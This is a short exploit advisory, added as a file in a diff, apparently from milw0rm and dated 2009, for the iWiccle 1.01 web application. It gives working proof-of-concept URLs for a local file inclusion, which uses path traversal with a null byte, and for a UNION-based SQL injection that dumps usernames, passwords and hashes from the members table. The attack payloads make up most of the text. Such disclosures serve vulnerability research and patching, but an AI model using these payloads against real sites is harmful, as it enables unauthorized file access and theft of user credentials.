@@ -1,0 +1,28 @@
+###########################################################################################
+[+] iWiccle 1.01 (LFI/SQL) Multiple Remote Vulnerabilities
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+############################################################################################
+
+[+] Download : http://www.wiccle.com/index.php?module=wiccle&show=download
+
+[+] Local File Inclusion
+
+ - PoC's
+
+     http://127.0.0.1/[path]/index.php?module=../../../../../../bootsect.bak%00
+
+     http://127.0.0.1/[path]/index.php?module=admin&show=../../../../../../bootsect.bak%00
+
+
+[+] SQL Injection
+
+ - PoC
+
+   http://127.0.0.1/[path]/index.php?module=admin&show=users&area=manage_users&action=edit_user&member_id=null+union+all+select+1,2,3,4,concat_ws
+(0x3a,member_username,member_password,member_hash),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41+from+w_members+where+member_id=1--
+
+############################################################################################
+
+# milw0rm.com [2009-07-27]
